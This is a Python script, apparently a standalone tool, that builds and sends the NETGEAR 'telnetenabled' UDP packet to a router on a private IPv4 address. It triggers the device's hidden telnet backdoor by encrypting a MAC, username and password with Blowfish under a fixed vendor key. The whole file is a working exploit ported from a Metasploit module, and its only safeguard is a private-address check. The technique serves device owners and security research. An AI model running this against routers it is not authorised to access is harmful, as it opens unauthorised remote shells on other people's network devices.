#!/usr/bin/env python3
"""Send one NETGEAR telnetenabled UDP packet to a specified private host.

Packet format follows the published Netgear TelnetEnable implementation:
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/telnet/netgear_telnetenable.rb
"""

import argparse
import hashlib
import ipaddress
import socket

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def swap_words(data):
    if len(data) % 4:
        raise ValueError("data must contain whole 32-bit words")
    return b"".join(data[i : i + 4][::-1] for i in range(0, len(data), 4))


def packet(mac, username, password):
    mac = mac.replace(":", "").replace("-", "").upper()
    if len(mac) != 12 or any(c not in "0123456789ABCDEF" for c in mac):
        raise ValueError("expected a 6-byte MAC address")
    fields = [mac.encode(), username.encode(), password.encode()]
    limits = [16, 16, 33]
    if any(len(field) > limit for field, limit in zip(fields, limits)):
        raise ValueError("MAC/username/password exceeds packet field length")
    cleartext = (fields[0].ljust(16, b"\0") + fields[1].ljust(16, b"\0") + fields[2].ljust(33, b"\0")).ljust(112, b"\0")
    payload = swap_words(hashlib.md5(cleartext).digest() + cleartext)
    key = b"AMBIT_TELNET_ENABLE+" + fields[2]
    cipher = Cipher(algorithms.Blowfish(key), modes.ECB()).encryptor()
    return swap_words(cipher.update(payload) + cipher.finalize())


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("ip")
    parser.add_argument("mac")
    parser.add_argument("username")
    parser.add_argument("password")
    args = parser.parse_args()
    ip = ipaddress.ip_address(args.ip)
    if not ip.is_private or ip.version != 4:
        parser.error("target must be a private IPv4 address")
    payload = packet(args.mac, args.username, args.password)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(payload, (args.ip, 23))
    print(f"Sent one {len(payload)}-byte UDP packet to {args.ip}:23")


if __name__ == "__main__":
    main()
